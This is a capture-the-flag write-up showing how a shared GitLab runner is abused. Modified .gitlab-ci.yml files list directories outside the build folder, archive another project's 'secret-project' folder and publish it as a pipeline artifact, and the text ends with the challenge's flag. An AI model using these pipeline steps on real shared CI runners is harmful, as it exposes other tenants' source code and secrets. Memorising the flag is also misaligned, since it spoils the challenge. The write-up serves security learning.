In this challenge you have access to a Gitlab repo with a runner.

After briefly checking the commit history, and not finding anything, it's time to focus on the runner.

I started by listing all the directories:

```yml
stages:
  - prepare
  - test
  - deploy
before_script:
  - apt-get update && apt-get install -y curl
  - ls -al .
  - ls -al ..
  - ls -al ../..
  - ls -al ../../..
prepare:
  stage: prepare
  script:
    - echo "Preparing environment..."
test:
  stage: test
  script:
    - echo "Running tests..."
    - echo "No tests defined"
deploy:
  stage: deploy
  script:
    - echo "Deploying the application..."
    - echo "No deployment defined"
  only:
    - main
```

```
$ ls -al ../..
total 16
drwxrwxr-x 4 gitlab-runner gitlab-runner 4096 Oct 24 21:17 .
drwxrwxr-x 3 gitlab-runner gitlab-runner 4096 Oct 24 21:17 ..
drwxrwxr-x 4 gitlab-runner gitlab-runner 4096 Oct 24 21:17 User
drwxrwxr-x 4 gitlab-runner gitlab-runner 4096 Oct 24 21:17 root
```

We can then inspect this interesting `root` directory:

```yml
stages:
  - prepare
  - test
  - deploy
before_script:
  - apt-get update && apt-get install -y curl
  - ls -al ../../root
prepare:
  stage: prepare
  script:
    - echo "Preparing environment..."
test:
  stage: test
  script:
    - echo "Running tests..."
    - echo "No tests defined"
deploy:
  stage: deploy
  script:
    - echo "Deploying the application..."
    - echo "No deployment defined"
  only:
    - main
```

```
$ ls -al ../../root
total 16
drwxrwxr-x 4 gitlab-runner gitlab-runner 4096 Oct 24 21:17 .
drwxrwxr-x 4 gitlab-runner gitlab-runner 4096 Oct 24 21:17 ..
drwxrwxr-x 6 gitlab-runner gitlab-runner 4096 Oct 24 21:17 secret-project
drwxrwxr-x 3 gitlab-runner gitlab-runner 4096 Oct 24 21:17 secret-project.tmp
```

At this point, enumerating things got annoying so I decided to simply download the `root/secret-project` folder:

```yml
stages:
  - prepare
  - test
  - deploy
before_script:
  - apt-get update && apt-get install -y curl
  - ls -al ../../root
prepare:
  stage: prepare
  script:
    - echo "Preparing environment..."
    - tar -cvf my_folder.tar.gz ../../root/secret-project 
  artifacts:
    paths:
	    - my_folder.tar.gz
    expire_in: 1 week
test:
  stage: test
  script:
    - echo "Running tests..."
    - echo "No tests defined"
deploy:
  stage: deploy
  script:
    - echo "Deploying the application..."
    - echo "No deployment defined"
  only:
    - main
```

The flag is simply in the `readme.md`:

`ECW{B3_c4reFU11_WiTh_Th053_Sh4rr3d_RunN3r5}`